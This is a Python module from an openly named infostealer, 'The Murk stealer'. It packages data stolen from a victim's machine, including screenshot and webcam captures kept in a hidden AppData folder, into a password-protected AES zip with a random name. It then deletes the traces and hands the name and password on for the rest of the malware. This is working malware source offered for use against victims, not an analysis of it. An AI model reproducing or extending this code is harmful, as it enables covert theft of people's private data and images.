#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#
import shutil
import os
import random
import pyzipper
#import gnupg

def makemeZip(name,password,np):
	try:
		user = os.environ['USERPROFILE'].replace("C\\Users\\")
	except:
		dox = "qwertyuiopasdfghjklzxcvbnm1234567890"
		for i in range (30):
			name += dox[random.randint(0,len(dox)-1)]
		name = rf"{os.environ['USERPROFILE']}\AppData\Local\{name}"
		for i in range (30):
			password += dox[random.randint(0,len(dox)-1)]
		print(password)
		path = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
		shutil.make_archive(fr'{path}\cashe', 'zip', fr'{path}\windll')
		shutil.move(fr'{path}\cashe.zip',"cashe.zip")
		pwd = bytes(password, "UTF-8")
		print(pwd)
		with pyzipper.AESZipFile(f'{name}.zip','w',compression=pyzipper.ZIP_STORED,encryption=pyzipper.WZ_AES) as logs:
			logs.setpassword(pwd)
			logs.write("cashe.zip")
		os.remove("cashe.zip")
		shutil.rmtree(rf'{path}\windll', ignore_errors=True)
		np.append(name)
		np.append(password)
		try:
			os.remove(rf'{path}\windll\sreenshot.jpg')
			os.remove(rf'{path}\windll\webcam.png')
		except:
			pass
		return np
	


		'''
		# Encrypt the zip file using a pre-defined public key
		gpg = gnupg.GPG()
		public_key = 'your_public_key_here'
		gpg.import_keys(public_key)
		with open(f'{name}.zip', 'rb') as f:
			encrypted_data = gpg.encrypt_file(f, recipients=None, always_trust=True)
		encrypted_file_name = 'encrypted.zip.gpg'
		with open(encrypted_file_name, 'wb') as f:
			f.write(encrypted_data.data)
			'''